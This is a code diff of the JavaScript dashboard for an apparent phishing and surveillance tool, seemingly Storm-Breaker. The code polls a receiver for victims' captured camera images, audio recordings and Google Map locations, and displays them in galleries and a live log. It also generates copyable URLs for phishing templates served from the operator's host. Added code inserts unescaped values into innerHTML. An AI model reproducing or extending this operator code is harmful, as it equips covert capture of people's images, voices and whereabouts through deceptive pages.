@@ -1,12 +1,9 @@
 var old_data = '';
-var log_history = []; // Store logs for download
+var log_history = [];
 
 function Listener() {
     $.post("receiver.php", { "send_me_result": "" }, function (data) {
         if (data != "") {
-            // Parse data if possible or handle raw string
-            // The PHP backend seems to send raw strings.
-
             var timestamp = new Date().toLocaleTimeString();
             var logType = 'info';
             var displayData = data;
@@ -16,13 +13,12 @@ function Listener() {
                 logType = 'image';
             } else if (data.includes("Audio")) {
                 show_notif("Audio File Saved", 'Path : ' + data.slice(26), false);
-                logType = 'image'; // Reuse color for media
+                logType = 'image';
             } else if (data.includes("Google Map")) {
                 show_notif("Google Map Link", data.slice(18), true);
                 logType = 'success';
             }
 
-            // Append to Terminal
             var logEntry = `
                 <div class="log-entry">
                     <span class="log-time">[${timestamp}]</span>
@@ -32,11 +28,9 @@ function Listener() {
 
             $("#log-terminal").append(logEntry);
 
-            // Auto scroll to bottom
             var terminal = document.getElementById("log-terminal");
             terminal.scrollTop = terminal.scrollHeight;
 
-            // Store for download
             log_history.push(`[${timestamp}] ${data}`);
         }
     });
@@ -102,52 +96,154 @@ function saveTextAsFile(textToWrite, fileNameToSaveAs) {
 }
 
 function check_new_version() {
-    var last_version = 0;
-    $.get("Settings.json", function (data) {
-        last_version += data.version;
-    });
-
-    function check_version_on_git() {
-        $.get("https://raw.githubusercontent.com/ultrasecurity/Storm-Breaker/main/Settings.json", function (data) {
-            new_version = JSON.parse(data);
-            if (last_version < new_version.version) {
-                show_notif("New version available :)", "https://github.com/ultrasecurity/Storm-Breaker", true);
-            }
-        });
-    }
-    setTimeout(check_version_on_git, 2000);
+    return;
 }
 
-$(document).ready(function () {
-    // Load Templates
-    $.post("list_templates.php", function (data) {
-        var get_json = JSON.parse(data);
-        var linksHtml = '';
-
-        for (let i = 0; i < get_json.length; i++) {
-            var url = "http://" + location.host + "/templates/" + get_json[i] + "/index.html";
-            linksHtml += `
-                <div class="link-item">
-                    <span class="link-url">${url}</span>
-                    <button class="btn-copy" data-url="${url}">
-                        <i class="fas fa-copy"></i> Copy
-                    </button>
-                </div>
-            `;
+function loadImages() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/images', true);
+    xhr.onload = function() {
+        try {
+            var response = JSON.parse(xhr.responseText);
+            var container = document.getElementById('images-gallery');
+            if (!container) return;
+            
+            if (response.images && response.images.length > 0) {
+                var html = '';
+                response.images.forEach(function(img) {
+                    html += `<div class="image-item" data-url="${img.url}">
+                        <img src="${img.url}" alt="${img.name}"/>
+                        <div class="image-filename">${img.name}</div>
+                        <div class="image-overlay">
+                            <button onclick="viewFullImage('${img.url}')"><i class="fas fa-search"></i> View</button>
+                            <button onclick="downloadImage('${img.url}', '${img.name}')"><i class="fas fa-download"></i> Download</button>
+                        </div>
+                    </div>`;
+                });
+                container.innerHTML = html;
+            } else {
+                container.innerHTML = `<div class="no-content"><i class="fas fa-camera"></i><p>No images captured yet</p></div>`;
+            }
+        } catch (e) {
+            console.error("Error loading images:", e);
         }
-        $("#links-container").html(linksHtml);
+    };
+    xhr.send();
+}
 
-        // Bind Copy Events
-        $(".btn-copy").click(function () {
-            var url = $(this).data('url');
-            navigator.clipboard.writeText(url);
+function loadAudio() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/audio', true);
+    xhr.onload = function() {
+        try {
+            var response = JSON.parse(xhr.responseText);
+            var container = document.getElementById('audio-list');
+            if (!container) return;
+            
+            if (response.audio && response.audio.length > 0) {
+                var html = '';
+                response.audio.forEach(function(audio) {
+                    var timestamp = new Date(audio.timestamp * 1000).toLocaleString();
+                    html += `<div class="audio-item">
+                        <div class="audio-icon"><i class="fas fa-volume-up"></i></div>
+                        <div class="audio-info">
+                            <div class="audio-filename">${audio.name}</div>
+                            <div class="audio-details">${timestamp}</div>
+                        </div>
+                        <div class="audio-player">
+                            <audio controls><source src="${audio.url}" type="audio/wav">Your browser does not support audio.</audio>
+                        </div>
+                        <div class="audio-controls">
+                            <button class="audio-btn" onclick="downloadAudio('${audio.url}', '${audio.name}')"><i class="fas fa-download"></i> Download</button>
+                        </div>
+                    </div>`;
+                });
+                container.innerHTML = html;
+            } else {
+                container.innerHTML = `<div class="no-content"><i class="fas fa-microphone"></i><p>No audio recordings yet</p></div>`;
+            }
+        } catch (e) {
+            console.error("Error loading audio:", e);
+        }
+    };
+    xhr.send();
+}
 
-            const originalText = $(this).html();
-            $(this).html('<i class="fas fa-check"></i> Copied');
-            setTimeout(() => {
-                $(this).html(originalText);
-            }, 2000);
+function viewFullImage(url) {
+    var width = window.innerWidth * 0.9;
+    var height = window.innerHeight * 0.9;
+    window.open(url, 'imageViewer', `width=${width},height=${height},resizable=yes,scrollbars=yes`);
+}
 
+function downloadImage(url, filename) {
+    var link = document.createElement('a');
+    link.href = url;
+    link.download = filename;
+    link.click();
+}
+
+function downloadAudio(url, filename) {
+    var link = document.createElement('a');
+    link.href = url;
+    link.download = filename;
+    link.click();
+}
+
+function clearAllImages() {
+    if (confirm('Delete all images?')) {
+        alert('Backend deletion not yet implemented');
+    }
+}
+
+function clearAllAudio() {
+    if (confirm('Delete all audio?')) {
+        alert('Backend deletion not yet implemented');
+    }
+}
+
+function loadPhishingTemplates() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', '/list_templates.php', true);
+    xhr.onload = function() {
+        try {
+            var data = JSON.parse(xhr.responseText);
+            var container = document.getElementById('links-container');
+            if (!container) return;
+            
+            var html = '';
+            if (Array.isArray(data) && data.length > 0) {
+                data.forEach(function(template) {
+                    // Use current protocol (http:// or https://) and host
+                    var url = location.protocol + "//" + location.host + "/templates/" + template.trim() + "/index.html";
+                    html += `<div class="link-item">
+                        <span class="link-url">${url}</span>
+                        <button class="btn-copy" onclick="copyToClipboard(this, '${url}')"><i class="fas fa-copy"></i> Copy</button>
+                    </div>`;
+                });
+            } else {
+                html = '<p style="color: var(--text-muted); padding: 20px; text-align: center;">No templates available</p>';
+            }
+            container.innerHTML = html;
+        } catch (e) {
+            console.error("Error loading templates:", e);
+            var container = document.getElementById('links-container');
+            if (container) {
+                container.innerHTML = '<p style="color: #ef4444; padding: 20px;">Error loading templates</p>';
+            }
+        }
+    };
+    xhr.send();
+}
+
+function copyToClipboard(btn, url) {
+    navigator.clipboard.writeText(url).then(() => {
+        var originalText = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-check"></i> Copied';
+        setTimeout(() => {
+            btn.innerHTML = originalText;
+        }, 2000);
+        
+        if (window.Swal) {
             Swal.fire({
                 icon: 'success',
                 title: 'Copied!',
@@ -155,35 +251,133 @@ $(document).ready(function () {
                 timer: 1500,
                 showConfirmButton: false
             });
-        });
-    });
-
-    // Listener Control
-    var timer = setInterval(Listener, 2000);
-    var isListening = true;
-
-    $("#btn-listen").click(function () {
-        if (isListening) {
-            clearInterval(timer);
-            console.log("stopped listener");
-            $(this).html('<i class="fas fa-play"></i> Start Listener').removeClass('btn-danger').addClass('btn-success');
-            isListening = false;
-        } else {
-            timer = setInterval(Listener, 2000);
-            console.log("started listener");
-            $(this).html('<i class="fas fa-stop"></i> Stop Listener').removeClass('btn-success').addClass('btn-danger');
-            isListening = true;
         }
     });
+}
 
-    // Clear Logs
-    $("#btn-clear").click(function () {
-        $("#log-terminal").html(`
-            <div class="log-entry">
-                <span class="log-time">[System]</span>
-                <span class="log-content">Logs cleared. Waiting for interactions...</span>
-            </div>
-        `);
-        log_history = [];
+window.addEventListener('load', function() {
+    console.log("Dashboard loading...");
+    
+    // Initialize tabs first
+    var tabButtons = document.querySelectorAll('.tab-btn');
+    console.log("Found " + tabButtons.length + " tab buttons");
+    
+    tabButtons.forEach(function(btn) {
+        console.log("Setting up tab button for:", btn.getAttribute('data-tab'));
+        btn.addEventListener('click', function(e) {
+            e.preventDefault();
+            var tabName = this.getAttribute('data-tab');
+            console.log("Clicked tab:", tabName);
+            
+            // Remove active class from all tabs and buttons
+            document.querySelectorAll('.tab-content').forEach(function(tab) {
+                tab.classList.remove('active');
+            });
+            
+            document.querySelectorAll('.tab-btn').forEach(function(b) {
+                b.classList.remove('active');
+            });
+            
+            // Add active class to clicked button and corresponding tab
+            this.classList.add('active');
+            var targetTab = document.getElementById('tab-' + tabName);
+            if (targetTab) {
+                console.log("Activating tab:", 'tab-' + tabName);
+                targetTab.classList.add('active');
+            } else {
+                console.warn("Tab not found:", 'tab-' + tabName);
+            }
+            
+            // Load content for specific tabs
+            if (tabName === 'images') {
+                loadImages();
+            } else if (tabName === 'audio') {
+                loadAudio();
+            }
+        });
     });
+    
+    setTimeout(function() {
+        loadPhishingTemplates();
+        console.log("Dashboard initialized successfully!");
+        
+        var timer = setInterval(Listener, 2000);
+        var isListening = true;
+        
+        var btnRefreshImages = document.getElementById('btn-refresh-images');
+        if (btnRefreshImages) {
+            btnRefreshImages.addEventListener('click', function() {
+                var icon = this.querySelector('i');
+                if (icon) icon.classList.add('fa-spin');
+                loadImages();
+                setTimeout(() => {
+                    if (icon) icon.classList.remove('fa-spin');
+                }, 1000);
+            });
+        }
+        
+        var btnClearImages = document.getElementById('btn-clear-images');
+        if (btnClearImages) {
+            btnClearImages.addEventListener('click', clearAllImages);
+        }
+        
+        var btnRefreshAudio = document.getElementById('btn-refresh-audio');
+        if (btnRefreshAudio) {
+            btnRefreshAudio.addEventListener('click', function() {
+                var icon = this.querySelector('i');
+                if (icon) icon.classList.add('fa-spin');
+                loadAudio();
+                setTimeout(() => {
+                    if (icon) icon.classList.remove('fa-spin');
+                }, 1000);
+            });
+        }
+        
+        var btnClearAudio = document.getElementById('btn-clear-audio');
+        if (btnClearAudio) {
+            btnClearAudio.addEventListener('click', clearAllAudio);
+        }
+        
+        var btnListen = document.getElementById('btn-listen');
+        if (btnListen) {
+            btnListen.addEventListener('click', function() {
+                if (isListening) {
+                    clearInterval(timer);
+                    this.innerHTML = '<i class="fas fa-play"></i> Start Listener';
+                    this.classList.remove('btn-danger');
+                    this.classList.add('btn-success');
+                    isListening = false;
+                } else {
+                    timer = setInterval(Listener, 2000);
+                    this.innerHTML = '<i class="fas fa-stop"></i> Stop Listener';
+                    this.classList.remove('btn-success');
+                    this.classList.add('btn-danger');
+                    isListening = true;
+                }
+            });
+        }
+        
+        var btnClear = document.getElementById('btn-clear');
+        if (btnClear) {
+            btnClear.addEventListener('click', function() {
+                var terminal = document.getElementById('log-terminal');
+                if (terminal) {
+                    terminal.innerHTML = `<div class="log-entry">
+                        <span class="log-time">[System]</span>
+                        <span class="log-content">Logs cleared. Waiting for interactions...</span>
+                    </div>`;
+                }
+                log_history = [];
+            });
+        }
+        
+        var btnDownload = document.getElementById('btn-download');
+        if (btnDownload) {
+            btnDownload.addEventListener('click', function() {
+                saveTextAsFile(getFullLogs(), 'log.txt');
+            });
+        }
+        
+        console.log("Dashboard initialized successfully!");
+    }, 100);
 });
